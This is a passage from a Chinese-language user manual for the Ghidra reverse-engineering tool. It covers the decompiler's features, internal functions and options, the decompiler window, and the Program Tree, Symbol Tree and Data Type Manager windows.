反编译器</strong></p><p>Ghidra自带复杂的转换引擎，能够将二进制表示的函数转化成更高层的C语言形式。Ghidra的反编译器包含以下功能：</p><p><strong>1.还原表达式：</strong></p><p>反编译器会进行完整的数据流分析从而对函数进行切离。由编译&#x2F;优化这个过程带来的复杂的表达式，会被还原成简单易读的形式。</p><p><strong>2.还原高级变量：</strong></p><p>反编译器会有效地还原最初程序所使用的变量，最小化引入新变量的需求。</p><p><strong>3.还原函数参数：</strong></p><p>反编译器会还原函数最初的形式。</p><p><strong>4.自动命名</strong></p><p>高级变量将会被合适地命名，数组的index值也会自动计算并用正确的格式显示出来，字符指针常量会被自动替换为对应的字符串。</p><p><strong>5.自动引入数据类型与名称</strong></p><p>当用户更改数据类型与名称的时候，反编译器会自动引入这些修改并应用，C语言输出也会随之更改。</p><p><strong>6.局部类型传播</strong></p><p>当信息不足的时候，反编译器会尽可能地提供相关的已知信息。因此，当遇到一个数据类型没有被确定的变量时，用户可以通过观察这个变量是如何被使用的，或者让已知的数据类型传播，来还原该变量的数据类型。</p><p><strong>变量</strong></p><p>反编译器会尝试结合不同位置的信息（堆、内存、寄存器）来决定函数内的变量。变量数据类型的信息也是由多个源头自动收集而来。比如，函数签名能够提供类型的信息。如果函数包含一个对全局内存位置的引用，而又有数据类型作用于这些位置上，反编译器也能从中得到信息。反编译器所得到的的信息越多，其产生出来的C代码便会更好。</p><p>未能够直接确定类型的变量可以通过局部类型传播来确定。我们往往只需要手动分配几个关键变量的类型，就能极大的提升C代码的可读性，因为反编译器可以通过局部类型传播来精确地分配其他数据类型。另外，手动分配函数签名中的类型，或是全局变量，会极为有效，因为这能同时影响多个函数。标明函数参数的数据类型非常有用。一个函数参数中定义了的数据类型会被传播到这个函数调用的所有函数当中。</p><p>如果你有程序所用API的C语言头文件，Ghidra提供了一个原型的C代码解析器。该解析器能够提取C代码中的数据类型信息并且创建一个Ghidra Data Type Archive(.gdt)文件。我们可以选择File→Parse C Source来打开该解析器。更多关于数据类型管理的内容，我们会在2.1.5中讲到。</p><p><strong>反编译器内部函数</strong></p><p>有时，反编译器会使用某个反编译器内部函数，这些函数没有被转化成像C代码的样子。出现这种情况通常说明产生的伪代码不正确，或者是需要被手动调整至更可读的输出。有时可能我们需要添加针对这种特定情况的额外简化规则。</p><p><strong>SUB41(x,e) 截断操作</strong></p><p>其中4代表着输入算子(x)的字节数，1代表着输出值的字节数。x为将被截断的值，e则是被截断的最低有效字节个数。举个例子：</p><p>SUB42(0xaabbccdd,1)&#x3D;0xbbcc</p><p>当e的值为0时，该操作基本是对整数大小间的转换。</p><p>SUB41(x,0)通常是从int到char的转换</p><p>SUB42(x,0)是从int到short的转换</p><p>SUB84(x,4)可能是扩展精度乘法的一部分，但也可能出现在诸如除法的强度折减的其他操作当中。</p><p><strong>CONCAT31(x,y) 连接两个算子</strong></p><p>其中3代表x的字节数，1代表y的字节数。输出结果会是一个4字节的连接，x会组成结果的最高有效字节部分，而y会组成最低有效字节部分。例：</p><p>CONCAT31（0xaabbcc,0xdd）&#x3D;0xaabbccdd</p><p>这个函数通常会在大小为1字节的变量(char)被储存于4字节的寄存器中出现。所有在4字节寄存器上的基本运算&#x2F;逻辑操作都能够正确地作用于1字节的变量，编译器只需要保证忽略寄存器中的3个最高有效字节。</p><p>CONCACT31被反编译器用来追踪这些被编译器忽略掉的最高有效字节。再多数情况下，反编译器能够做到这一点，然而在循环结构中却不行。这是由反编译器源代码所带来的难以解决的问题。</p><p><strong>ZEXT14(x) 0的扩展</strong></p><p>其中1代表x的字节数,4代表输出值的字节数。该函数绝大多数情况下是对小的整型到较大的无符号整型的转换。</p><p><strong>SEXT14(x) 有符号的扩展</strong></p><p>其中1代表x的字节数,4代表输出值的字节数。该函数绝大多数情况下是对小的有符号整型到较大的有符号整型的转换。</p><p><strong>SBORROW4(x,y) 判断两数相减有无运算溢出</strong></p><p>其中4代表x与y的字节数，x,y均为有符号整型。该函数在x-y会造成运算溢出的情况下返回true。该函数一般由两个有符号整型的比较中产生。尽管反编译器中有还原比较的规则，这是一个没有被涵盖到的特殊情况。</p><p><strong>CARRY4(x,y) 判断x+y是否进位</strong></p><p><strong>SCARRY4(x,y)判断x+y是否导致有符号的溢出</strong></p><p>其中4代表x与y的字节数。如果x+y导致进位，将会返回true。</p><p><strong>寄存器设置</strong></p><p>有时程序会使用一个寄存器来储存一个全局常数。我们可以在陈列窗口右键菜单中选择Set Register Values来指定该值。这个常数会自动传播到反编译器中的相关函数中，我们得到的C代码也可能因此被进一步简化。</p><p><img src="blob:file:///39d43dd4-9656-4bd3-8649-a371423e3aff" alt="202004030956_WJ864BURC8EGNYK.png"></p><p>图2-14 寄存器设置</p><p><strong>反编译器选项</strong></p><p>如下则是一些可用的反编译器分析选项(Edit→Tool Options→Decompiler&#x2F;Analysis):</p><p><img src="blob:file:///684a725f-f3af-4343-931c-3b7c6d2d2e53" alt="202004030956_HC75USV9REMUJ3H.png"></p><p>图2-15 反编译器选项</p><p>Eliminate unreadable code：让反编译器去除它认为不可读的代码部分。</p><p>Ignore unimplemented instructions：让反编译器忽略那些语义被标记为未实现的指令。</p><p>Infer constant pointers：允许反编译器推断那些看起来像指针的常数的数据类型。如果常数的地址看起来像是程序中已知的数据或者函数，该常数会被假设为一个指针。</p><p>Respect read-only flags：让反编译器将被标记为只读的内存当作常数值。对那些真正只读，并且从未变化过的值，该段内存会被在Memory Manager中被标记为只读。</p><p>Simplify predication：使反编译器简化条件指令，合并使用相同判断条件的if else的代码段。</p><p>Simplify extended integer operations：使反编译器简化对整型的操作。当一个值被分为多个部分并在不同阶段操作时，反编译器会尝试将这些阶段合并，还原出单一的操作。</p><p>Use in-place assignment operators：使反编译器在输出中使用像+&#x3D;这样的分配操作符。</p><p>Decompiler Timeout(seconds)：设定允许有反编译器运行的秒数。目前这个时间设置不影响用户界面，用户界面会无止境的运行。这个设定目前只影响后台使用decompiler.syntax的分析进程。</p><p><strong>2.2.2 反编译窗口</strong></p><p>现在我们会开始介绍Ghidra反编译器所提供的用户界面，也就是反编译窗口（Decompiler Window）的使用。反编译窗口默认位于陈列窗口的右边。</p><p><img src="blob:file:///17a5fc8f-705f-46a3-b43f-f8ae59fd8fbf" alt="202004030957_9ETKA2AQD2JR723.png"></p><p>图2-16 反编译窗口</p><p>如果窗口被关闭，我们也可以从Window→Decompile中将其打开。</p><p><strong>鼠标活动</strong></p><p>双击：导向至双击的标志</p><p>Ctrl+双击：在新窗口中导向至双击的标志</p><p>中键点击：高亮显示所有与所点击的目标相同的内容</p><p><strong>复制</strong></p><p>我们可以将反编译窗口中的C代码复制，选择需要复制的文本，并从右键菜单中选择Copy，也可以直接使用快捷键Ctrl+C。</p><p><strong>重命名</strong></p><p>我们可以重命名任意的参数或者变量，右键点击变量，选择Rename Variable（快捷键L），便可更改变量名。</p><p><img src="blob:file:///3badda1d-4874-4ae6-ac25-66c3957a1ae8" alt="202004030957_J6KV8R3D2Q6UQAE.png"></p><p>图2-17 重命名变量</p><p>而重命名函数，需要点击函数名，右键菜单中选择Rename Function（快捷键L）。</p><p><strong>重定义变量类型</strong></p><p>尽管反编译器会尽可能地自动还原变量类型，它时常得不到足够的信息。我们可以手动变更一些变量的类型来改善所得到的C代码。右键点击变量，选择Retype Variable（快捷键Ctrl+L）。任何该程序已知的类型都可以使用。</p><p><img src="blob:file:///a9d1bebc-d940-40b6-9af8-54afd691d02c" alt="202004030957_PE6UKADH335KNUM.png"></p><p>图2-18 更改变量类型</p><p>一个简单有效的提升反编译器所生成的代码质量的方式是，找到函数有明显的字符串参数的函数，并将参数的类型改为char *。之后对任何对定义的内存的引用都会将所传递的参数显示为string。</p><p><strong>编辑函数签名</strong></p><p>右键菜单中选择Edit Function Signature，我们便可以更改函数签名。</p><p><img src="blob:file:///26c484f6-39ca-4abd-ade6-fb50b0ea5fe7" alt="202004030958_BDSCH4E5UM6HNG2.png"></p><p>图2-19 编辑函数签名</p><p>函数签名包括函数名、返回类型、参数个数、参数名、参数类型、变量参数（varargs）。</p><p>我们可以通过修改函数签名的字符串来修改以上任意内容。比如说，当我们发现某个函数实际上是printf的话，我们可以在输入void printf(char *x, …)。</p><p>另外，我们也可以选中Calling Convention（见图2-19）来从一系列可用的调用约定中选择。勾选inline以指示内联函数。勾选No Return以指示该函数不返回。</p><p><strong>查找</strong></p><p>右键菜单中的Find功能（Ctrl+F），支持在当前函数中对正则表达式或者字符串的查找。</p><p><strong>导出成C代码</strong></p><p>选择下图所示图标，可将当前反编译的函数导出。如果不指定文件扩展名，Ghidra会将其保存为.c文件。</p><p><img src="blob:file:///75f032ce-6137-4b57-bdf3-1d3b708dc599" alt="202004030958_RZ4PNSM86GCTY5S.png"></p><p>图2-20 编辑函数签名</p><p>#ghidra使用手册</p><p><strong>2.3 Program Tree管理窗口</strong></p><p>Program Tree（以下称作“程序树”）管理窗口默认位于界面的左上角。程序树被用来将程序组织进一个树结构。我们可以用程序树中的节点在CodeBrowser中进行导向，我们也能够利用程序树限制CodeBrowser中所显示的内容（可参考2.1中关于限制当前视窗显示内容的部分）。程序树管理器可以创建、删除、重命名或关闭程序树的视图。</p><p><img src="blob:file:///a6a57ecd-b300-49b8-afae-46c3e8329071" alt="202004031002_RCR32SXB8BDRQ2D.png"></p><p>图2-21 程序树管理窗口</p><p><strong>2.3.1 文件夹与分段</strong></p><p>程序树将一个程序组织成文件夹与分段（folders and fragments）。分段包含着代码的单元，而代码单元只能存在于一个且只有一个分段中。文件夹则可以包含分段和其他文件夹。这里所说的文件夹不像文件系统当中的文件夹，除了根文件夹之外的任意文件夹，和分段，都可以有不止一个的父文件夹。当用户将一个文件夹或分段（暂且称之为A）复制到另一个父文件夹下时，不会有新的A被创建，而是目标文件夹会被添加为A的另一文件夹。</p><p><strong>创建文件夹</strong></p><p>1 右键选择窗口中的一个文件夹</p><p>2 右键菜单中选中Create Folder</p><p><strong>创建分段</strong></p><p>1 右键选择窗口中的一个文件夹</p><p>2 右键菜单中选择Create Fragment</p><p>我们也可以通过拖动陈列窗口中的代码单元来创建分段，只需拖动选中的代码单元到一个文件夹。该新建的分段的名称将会由所选代码单元中的第一个地址名称所决定。如果拖动的代码单元有标签，分段的名称将会被默认地设为标签名。</p><p><strong>删除</strong></p><p>满足以下两种情况之一时，我们才能够删除文件夹或分段A。</p><p>1 A是空的。</p><p>2 A存在于其他的文件夹中。</p><p>右键选择Delete以将其删除。</p><p><strong>排序</strong></p><p>用户可以选择以地址或名称顺序对程序树中内容进行排序。</p><p>1 右键选择一个文件夹</p><p>2 Sort→by Address（以地址顺序），Sort→by Name（以名称顺序）。</p><p>#ghidra使用手册</p><p><strong>2.4 Symbol Tree 窗口</strong></p><p>Symbol Tree窗口，以下称作符号树窗口，将程序分为五个大类显示：Externals、Function、Labels、Classes与Namespaces。</p><p>符号树窗口默认显示于程序树窗口下方，如果关闭后想将其重新打开，选择Window→Symbol Tree。</p><p><img src="blob:file:///661babf3-fd99-4dcf-a1c3-f3390a17f662" alt="202004031003_D5YCDRQCQPCCYHZ.png"></p><p>图2-22 程序树管理窗口</p><p><strong>2.4.1 显示</strong></p><p>我们将对上图中可见到的类别一一介绍。</p><p><strong>Imports</strong></p><p>Imports类别包含了代表外部库命名空间的符号。库名<EXTERNAL>被预留以放置那些还没有与特定的库关联的外部符号。</p><p><img src="blob:file:///3e7fac23-6e12-4432-8cfc-2983c00c7006" alt="202004031004_RMUNMEQVW3J6NPD.png"></p><p>图2-23 <EXTERNAL></p><p><strong>Exports</strong></p><p>Exports包含了那些代表导出的入口点的符号。</p><p><strong>Functions</strong></p><p>Functions包含了代表程序中函数的符号（除外部函数）。我们可以打开一个函数的符号来显示它的参数和变量符号。</p><p><img src="blob:file:///31a036fe-8373-4599-8b9e-3167e40b219d" alt="202004031004_RZQQXTARRE7B6J6.png"></p><p>图2-24 显示参数与变量</p><p><strong>Labels</strong></p><p>所有Labels类别中的符号都处于全局命名空间中。</p><p><strong>Class</strong></p><p>Class包含了那些可能包含函数命名空间或标记符号的类的命名空间。</p><p><strong>Namespace</strong></p><p>Namespace包含了处于全局命名空间中的通用命名空间，也可能包含类、函数、标记、或其他命名空间。</p><p><strong>2.4.2 创建库</strong></p><p>用户可以创建一个库的名字并将其指代一个外部库。这个名字因此就可以与程序（或库）相关联并允许用户进行导向或阅读代码。右键点击Imports文件夹并选择Create Library。所创建的库默认名称会是NewLibrary。</p><p><strong>2.4.3 设置外部程序</strong></p><p>右键点击你想要的关联的Imports文件夹中的库，并选择Set External Program，这将弹出一个选择外部程序的会话，我们可以在该会话中选择想关联的外部程序（或库）。之后，用户便能够对外部引用进行导向或阅读代码。</p><p><strong>2.4.4 外部位置</strong></p><p>右键点击某个库，并选择Create External Location，便会弹出一个创建外部位置的对话(如下图)。External Program Path，即是程序对应的库，在项目中有关联程序的情况下会被自动填充。另外的情况下，我们可以从Edit手动选择。我们需要为外部位置指定Label（标签）或是Address（地址）。勾选Make External Function将创建一个外部函数。不勾选的情况下，一个非函数的外部位置将被创建。</p><p><img src="blob:file:///4d4409ec-0d5d-4de8-9b3c-acd38435e752" alt="202004031005_59KKF3FJPKP75HN.png"></p><p>图2-25 创建外部位置</p><p>在上图所显示的对话中，我们创建了一个外部函数，被标记为A_Label，位于Lib中的地址0xdeadbeef。这个库的名称Lib，则将会与项目中的lib_example文件相关联。</p><p>与上述操作类似，我们可以对外部位置进行编辑。右键选择外部位置&#x2F;外部函数并选择便可以调出编辑外部位置的对话。</p><p>如果我们选中一个外部位置的标志，会被导向至一个外部的引用源，该引用源指向外部位置。如果想要真正地导向到这个外部位置，右键点击标志并选择Go To External Location。</p><p><strong>2.4.5 创建类与命名空间</strong></p><p>右键选中一个父命名空间并选择Create Class选项。所有在Class类别中的类，都在全局命名空间中。</p><p>相似地，我们可以在全局命名空间、类、或者其他命名空间中创建命名空间。右键点击父命名空间并选择Create Namespace。所有在Namespace类别中的命名空间，都在全局命名空间中。</p><p>#ghidra使用手册</p><p><strong>2.5 Data Type 管理器</strong></p><p>Data Type Manager，以下称为“数据类型管理器”，让用户能够定位、组织数据类型，也能够将数据类型应用于程序。Ghidra的一个长期的目标，便是让用户能够搭建数据类型的库，并在不同的程序、项目甚至用户之间分享使用。</p><p><strong>2.5.1 基本概念</strong></p><p><strong>数据类型</strong></p><p>Ghidra支持三类数据类型：Built-in、user defined、derived。</p><p><strong>类型</strong></p><p><strong>描述</strong></p><p><strong>Built-in</strong></p><p>直接由Java实现并被用于基本的标准类型，比如byte、word、string等等，不能被改变或重命名。</p><p><strong>User Defined</strong></p><p>有四个用户定义（user defined）的数据类型，分别是Structures、Unions、Enums和Typedefs，可以被创建、修改及重命名。</p><p><strong>Derived</strong></p><p>两种派生的数据类型：Pointers（指针）和Arrays（数组），可以被创建与删除，但是名字由其基本类型决定。</p><p><strong>数据类型档案</strong></p><p>数据类型档案被用于在程序、项目和用户间打包并分享数据类型。有两种用户创建的档案类型：文件数据类型档案（File data type archives）和项目数据类型档案（Project data type archives）。数据类型档案可以在数据类型管理器中访问。一个被打开的数据类型档案将会被显示为数据类型管理树中的一个节点。档案可以被用户手动打开，也可以被引用它的程序自动打开。</p><p><strong>内置数据类型档案</strong></p><p>Built-in档案，即内置数据类型档案，总会出现在数据类型管理器中。它支持对所有Ghidra 内置数据类型的访问。</p><p><img src="blob:file:///4ce037d7-8b0b-475a-8a0c-93e1a3a88dd0" alt="202004031006_UPGYXVX9B4GFGA4.png"></p><p>图2-26 内置数据类型档案</p><p><strong>文件数据类型档案</strong></p><p>文件数据类型档案，以下简称为“文件档案”，将数据类型储存于扩展名为.gdt的文件中，可以位于文件系统中的任意位置。在被分享使用的文件系统中，文件档案可以被多个用户同时打开，但是只有其中一个用户能够打开并对其做修改。</p><p><strong>项目数据类型档案</strong></p><p>项目数据类型档案，以下简称为“项目档案”，将数据类型与其他程序一起，储存于Ghidra项目数据库目录当中。Ghidra项目窗口会将项目中的项目档案如同其他程序一样展示。项目档案可以被记录版本并可在多用户环境中共用。</p><p><strong>程序中的数据类型</strong></p><p>除了存储于档案中，数据类型也能被存于程序内部。任何在程序中使用的数据类型一定会被存储于程序当中，即使它最初来自于某个档案。</p><p><img src="blob:file:///fac046ef-7325-4f12-aafe-785d188f27ca" alt="202004031006_7N68NCSJKDQ5SXM.png"></p><p>图2-27 程序中的数据类型</p><p><strong>应用数据类型*</strong>*</p><p>将数据类型应用于程序当中是我们的主要目的。数据类型可以被应用于内存上的位置，来让Ghidra知道该位置中的那些字节究竟是什么。数据类型也可以用来描述函数的参数和局部变量。</p><p>我们可以通过拖动数据类型至陈列窗口中的某个元素，来应用该数据类型。我们会在后面的章节中更细致的介绍应用数据类型的其他方法。</p><p>当一个来自于档案中的数据类型被应用于某个程序时，一份该数据类型的拷贝会在该程序中产生。我们将产生这份拷贝的过程称之为“解析”（resolving）。这是一个复杂的过程，因为数据类型可以包含或引用其他的数据类型。这些引用的数据类型既可能存在，也可能不存在于该程序中，而解析的过程要考虑到这些情况。有时，程序中可能存在与需要解析的数据类型同名的类型。即使这两个产生冲突的数据类型一致，Ghidra也难以对其进行判断与处理。通常来说，Ghidra会通过重命名新的类型，将.conflict添加到这个新的数据类型名称之后，来解决这类问题。对于许多从数据类型管理器触发的操作来说，冲突的解决办法由当前的“数据类型冲突模式”（Data Type Conflict Mode）决定。添加一个单一的数据类型往往会导致许多新的数据类型被添加到程序当中。</p><p><strong>2.5.2 数据类型档案操作</strong></p><p>在2.5.1当中，我们已经知道用户创建的数据类型档案分为文件档案与项目档案。通常来说，文件档案会被以只读模式打开，而项目档案会被打开用于编辑。项目档案支持分享与版本控制，因此允许多个用户同时对其进行更改。而文件档案同时只允许一个用户进行编辑。</p><p><img src="blob:file:///02b91a3d-74d8-454f-a842-9f18dce7cf4c" alt="202004031007_EPGH67G3ZH59DBP.png"></p><p>图2-28 在倒三角菜单中，选择对档案的操作</p><p><strong>文件档案</strong></p><p>在上图中，我们可以看到一系列关于档案操作的选项。选择New File Archive…，便会出现一个文件选择对话。选择一个目录并输入新档案的名称。一个新的档案便会出现在数据类型管理器当中。</p><p>如果想要打开文件档案，选择Open File Archive…，后面的操作与上述操作类似。</p><p>文件档案打开后，不能直接用于编辑。如果想对其进行编辑，我们需要右键点击该档案并选择Open for Editing。如果其他用户正在对该档案进行编辑，这个操作会失败，我们会被提示有其他用户正在编辑该档案。</p><p>档案中未保存的更改会被加上*符号来提醒用户。我们可以右键点击编辑的档案，并选择Save Archive来对其进行保存。也可以选择Save As…将编辑的档案保存在新的文件当中。</p><p>当不再需要编辑该文件档案时，我们应将该档案转变回只读模式。右键点击该档案并选择Close for Editing。</p><p><strong>项目档案</strong></p><p>选择New Project Archive…，并在出现的对话中选择一个文件夹，输入新档案的名称。我们也可以简单地将.gdt文件，即文件档案，拖入Ghidra项目窗口中，这也能够添加新的项目档案。</p><p>如果想要打开项目档案，选择Open Project Archive…，后面的操作与上述操作类似。</p><p><strong>2.5.3 数据类型操作*</strong>*</p><p>数据类型是档案中真正有用的内容。数据类型可以被应用于程序，并丰富其中数据、参数、局部变量和函数返回类型的意义。用户定义的数据类型可以变得十分复杂，但他们最终都是基于内置数据类型。</p><p><strong>将数据类型应用于程序</strong></p><p>用户可以通过以下两种方法应用数据类型。</p><p>1 拖动：我们可以通过将数据类型拖动于陈列窗口的相应元素上来应用数据类型。在下图中，我们将内置类型中的int拖动到函数名main上，便可以将int类型应用于main函数的返回值。</p><p><img src="blob:file:///6a3889a1-2c83-4af8-8c8b-ca0aecaadf46" alt="202004031007_QZP6VE2FH8MUNWX.png"></p><p>图2-29 拖动数据类型</p><p>2 陈列窗口中进行应用：在陈列窗口中，右键点击某一元素，选择Set Data Type，便可以从提供的常用数据类型中进行选择。我们也可以直接选中元素，并按快捷键T，来调出选择数据类型的对话。</p><p><img src="blob:file:///4de37e8e-88cb-43c5-9349-a642f540acf5" alt="202004031008_QEQDTUJPMNN8544.png"></p><p>图2-30 陈列窗口中进行操作</p><p>需要注意的是，从档案中应用数据类型会自动将该数据类型添加至本程序的档案中。该档案也会被自动与该程序关联，以后打开这个程序时，该档案也会被打开。</p><p><strong>创建用户定义数据类型</strong></p><p>有七种用户可以创建的数据类型：Structures、Unions、Enums、Function Definitions、Typedefs和Pointers。</p><p>右键点击想要创建新类型的目录，选择New→Structure，New→Union，New→Enum，New→Function Definition来创建对应的数据类型。下图是创建新的Structure的示例。</p><p><img src="blob:file:///f4b27ff2-a36a-491c-a9d9-3b144b7dcb68" alt="202004031008_ETHAENWPYUR6N85.png"></p><p>图2-31 创建新的Structure</p><p>创建typedef更加简单，右键选择需要被typedef的数据类型（称之为A），选择New→Typedef on A。此外，我们还可以选择New→Typedef…来调出一个完整的对话窗口。</p><p><img src="blob:file:///6f751c5b-7bb8-45e3-b618-788785e9139f" alt="202004031008_JN54XURXGDRT6D2.png"></p><p>图2-32 通过完整对话窗口创建新的Typedef</p><p>类似地，如果想创建一个Pointer，选择New→Pointer to A。需要注意的是，我们不能对内置数据类型的目录进行更改。所以如果我们在内置数据类型目录下创建Pointer或Typedef，所生成的数据类型会被放置于程序的数据类型根目录下。</p><p><strong>编辑数据类型</strong></p><p>只有Structure，Union，Enums和Function Definitions能够被编辑。在数据类型管理器中双击或右键并选择Edit这类节点，便可以打开对应的编辑器。</p><p><strong>从所选枚举类型创建新的枚举类型</strong></p><p>我们可以通过选择两个或以上的枚举类型（Enums），再选择Create Enum form Selection。输入新的Enum的名字便可以完成创建。所得的Enum会包含所选的Enums的名称与值。需要注意的是，如果所选枚举中含有相同的值，这些值都会被添加至新的枚举中。然而，只有第一个该值将在应用时生效。</p><p><img src="blob:file:///7327ba3d-ab73-44ae-9d80-6df3c31947ce" alt="202004031009_BMEN3SR26H8JK6C.png"></p><p>图2-33 从所选枚举类型创建新的枚举类型</p><p><strong>删除，移动与复制</strong></p><p>我们可以右键点击选择Delete来对数据类型进行删除。一个确认的对话窗口将会弹出，提醒用户该操作不能被撤回。</p><p><img src="blob:file:///f06cc77c-0761-4f77-8111-3d1665288c18" alt="202004031009_KBUE5VSQJJAYV4T.png"></p><p>图2-34 不能用Undo功能撤回</p><p>数据类型只可以在同一个档案中移动，如果想在不同档案间移动数据类型，该数据类型会被复制。我们可以通过两种方法移动一个数据类型：</p><p>1 拖动</p><p>2 剪切&#x2F;粘贴：右键点击想要移动的数据类型，并选择Cut，之后右键点击目标父目录并选择Paste。</p><p>数据类型可以在一个档案之中进行复制，也可以从一个档案复制至另一个档案。然而在这两种情况下，复制的行为其实是不同的。当在一个档案之中进行复制时，源数据类型的一个复制自然地被放置在目标目录下。然而当在不同档案间进行复制时，任何包含于所复制的数据类型中的数据类型都会被按照相对路径复制到目标档案之中。</p><p>相似地，我们有两种办法复制一个数据类型。</p><p>1 拖动</p><p>2 复制&#x2F;粘贴：右键点击想要移动的数据类型，并选择Copy，之后右键点击目标父目录并选择Paste</p><p><strong>对齐数据类型</strong></p><p>右键点击想要进行对齐操作的Structure或Union，并选择Align。</p><p><strong>承认对源档案的改动</strong></p><p>如果我们作出了对与源档案有关联的数据类型的改动，这些改动需要被应用至源档案以确保不同位置的数据类型是同步的。右键点击想要承认改动的数据类型，并选择Commit to Archive，改动便将被应用至源档案之中。</p><p><strong>从源档案更新数据类型</strong></p><p>如果我们对源档案当中的数据类型作出了改变，而这些数据类型又有所关联的数据类型存在于其他档案或是程序的档案当中，我们便需要从源档案当中更新数据类型。右键点击想要更新的数据类型，并选择Update From Archive。</p><p><strong>取消改动</strong></p><p>如果我们作出了对与源档案有关联的数据类型的改动，但不想保留且应用这些改动，我们可以将其返回至最初的状态。右键点击数据类型并选择Revert便能移除改动。</p><p><strong>关联&#x2F;取消关联</strong></p><p>当一个数据类型被应用于一个程序中时，该数据类型的一份复制就会创建于程序内。另外，一个与原数据类型的关联也会被建立。然而，当一个数据类型被创建于程序中，并之后被移动到档案中时，会弹出一个对话询问用户是否希望一个关联被建立。如果选择yes，关联将被创建，档案会变成该数据类型的源。</p><p><img src="blob:file:///6d6f7502-c22f-4627-92da-a069590e1422" alt="202004031009_GN9DGARCPN9AMV8.png"></p><p>图2-35 是否建立关联</p><p>如果想要取消某个数据类型与源档案的关联，我们右键点击数据类型并选择Disassociate From Archive。该数据类型便会变成局部的数据类型，任何对其的修改也不会影响到源档案中的原数据类型。</p><p><strong>处理数据类型冲突</strong></p><p>当我们尝试移动或者复制数据类型到一个含有同名数据类型的目录下时，便会引发冲突。我们可以在数据类型管理器中提前设置解决冲突的模式。</p><p><img src="blob:file:///6b105190-97c9-4407-8fb4-3bf7e63b1115" alt="202004031010_XHVNYFQPQYZMQS8.png"></p><p>图2-36 处理数据类型冲突</p><p>如上图所示，我们可以在所示图标处选择一种解决冲突的模式。</p><p>1 Rename New or Moved Data Type:</p><p>将新建或移动过来的数据类型重命名。如原名称是A，其将会被重命名为A.conflict。</p><p>2 Use Existing Data Type:</p><p>目标目录将不受影响，继续使用改动前的数据类型。</p><p>3 Replace Existing Data Type:</p><p>与选项2相对地，选择此项将会删除现存的数据类型，并用移动或新建而来的数据类型代替。</p><p>4 Replace Empty Structures else Rename:</p><p>与选项1类似，只有在目标目录中的冲突类型为一个空的Structure时，移动或新建而来的Structure会将其代替。</p><p><strong>替换数据类型</strong></p><p>数据类型可以被替换为其他的数据类型。这意味着程序中所有的该数据类型将会被替换为新的数据类型，原数据类型将被删除。有两个方式进行该操作：</p><p>1 拖动：将数据类型拖动至将被替换的数据类型上。</p><p>2 复制&#x2F;粘贴：右键点击数据类型，并选择Cut。接下来右键选择将被替换的数据类型，选择Paste。</p><p><img src="blob:file:///bcb48e33-c8db-4631-b35d-cd0f64dd0300" alt="202004031010_KU3KK5VPTA4TMH2.png"></p><p>图2-37 替换数据类型</p><p>不过使用哪一种方法，都将弹出一个用于确认的对话窗口。</p><p><strong>设置偏好的数据类型</strong></p><p>数据类型可以被标记为偏好的(favorites)，这些数据类型由此可以出现在陈列窗口的Set Data Type选项当中。这是一个快速将数据类型应用到程序当中的方法。CodeBrowser将大多数常用的内置数据类型标记为了受偏好的。</p><p><img src="blob:file:///96b34efc-7e94-48e3-9302-d7e855ac9ebf" alt="202004031010_8MGUDS7BDSAF47N.png"></p><p>图2-38 喜爱的数据类型出现位置</p><p>想要设置偏好的数据类型，我们可以右键点击数据类型并选择Favorite。偏好的数据类型将会被标以心形图标（如下图所示）。</p><p><img src="blob:file:///53bc70fd-e581-4e2b-a003-6df3d3b22239" alt="202004031010_ZUCJJKZF9XUVRCR.png"></p><p>图2-39 偏好的数据类型</p><p>想要移除偏好，右键点击数据类型并取消对Favorite的选择。</p><p>需要注意的是，偏好的数据类型的名字必须是独特的。如果我们在目录A与目录B都有叫做A_type的数据类型，我们便不能同时将他们设置为偏好的数据类型。此外，任意的数据类型都可以被设置为偏好的。然而，只有对内置数据类型的设置会在你退出项目或关闭Ghidra时被保存为工具的设置。</p><p><strong>2.5.4 编辑用户定义的数据类型*</strong>*</p><p>我们可以通过Structure专用的编辑器来编辑一个结构体数据类型的内容。编辑器可被用于创建新的或编辑已经存在的Structure。下图是编辑器的内容。</p><p><img src="blob:file:///ac21f0a6-85ea-4097-aa8e-6d4dccf8062d" alt="202004031011_N6VTPAHG32YH6MU.png"></p><p>图2-40 Structure编辑器</p><p>Union的编辑器与Structure的类似。Union的所有组成部分都位于偏移0。</p><p><img src="blob:file:///1e0dfd22-4ed0-4aff-b72d-fcf403cd3698" alt="202004031011_DVCQGTFWGCK44TR.png"></p><p>图2-41 Union编辑器</p><p>我们可以点击右上角的保存图标来应用对于Union或者Structure的修改。</p><p><img src="blob:file:///b0f1e5d2-614c-42fe-80c5-7c01931e64bb" alt="202004031011_DX2ERAR93CCENK8.png"></p><p>图2-42 保存图标</p><p><strong>编辑器中的搜索</strong></p><p>我们可以在编辑器的Search栏中输入想要搜索的内容，并通过上下箭头来选择进行向上或是向下的搜索。</p><p><strong>对齐</strong></p><p>我们可以在Align的勾选框中选择是否对齐。如果勾选，将会出现额外的选项。</p><p><img src="blob:file:///aa3508c8-10bf-472f-ad20-28e8bab7bb67" alt="202004031012_Y5BA3EP7KXDT5TX.png"></p><p>图2-43 额外的选项</p><p><strong>未对齐的Structure</strong></p><p>当一个Structure未被对齐，它其中的每个组成部分将会紧挨着上一个。也就是说，不会出现自动的对齐或是填充。</p><p><strong>对齐的Structure</strong></p><p>在对齐的Structure当中，各个组成部分的偏移将会基于他们的数据类型和位置被自动地对齐。一个默认的未定义字节不能被添加到一个对齐的Structure中。而该Structure的总大小取决于所包含的组成部分，以及这些组成部分是否被包入(packed)。如图2-43所示，我们可以在编辑器中指定对齐的属性。</p><p>align(minimum)：这个属性指示最小的对齐值。在窗口中可以指定的选项有以下三种。</p><p>1 none：不指定最小的对齐值。对该数据类型中组成部分的对齐值取决于其组成部分和包入。</p><p>2 machine：将最小的对齐值设置为机器的对齐值。</p><p>3 by value：指定最小的对齐值。</p><p>pack(maximum)：这个属性指示包入值。在窗口中可以指定的选项有以下两种。</p><p>1 none：Structure中的组成部分按照编译器的默认方式对齐，组成部分不被包入。</p><p>2 by 